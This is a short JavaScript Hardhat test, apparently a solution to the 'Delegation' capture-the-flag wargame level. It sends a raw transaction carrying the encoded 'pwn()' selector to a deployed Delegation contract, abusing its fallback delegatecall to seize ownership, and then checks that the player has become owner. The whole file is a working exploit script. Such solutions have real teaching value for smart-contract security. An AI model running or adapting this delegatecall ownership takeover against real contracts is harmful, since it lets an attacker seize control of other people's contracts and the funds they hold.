const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

describe.only("Delegation hack", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        delegation = await ethers.getContractAt("Delegation", process.env.DELEGATION_ADDRESS);
});
    describe("Change Ownership", function() {
        it("Should change owner to player", async function() {
            expect(await delegation.owner()).to.not.equal(player.address);
            transactionResponse = await player.sendTransaction({
                to: delegation.address,
                gasLimit: 2_000_000,
                data: (new ethers.utils.Interface(["function pwn() public"])).encodeFunctionData("pwn")
                // data: "0xdd365b8b" //first 4bytes of signature of "pwn()"
            });
            await transactionResponse.wait();
            expect(await delegation.owner()).to.equal(player.address);
        });
    });
});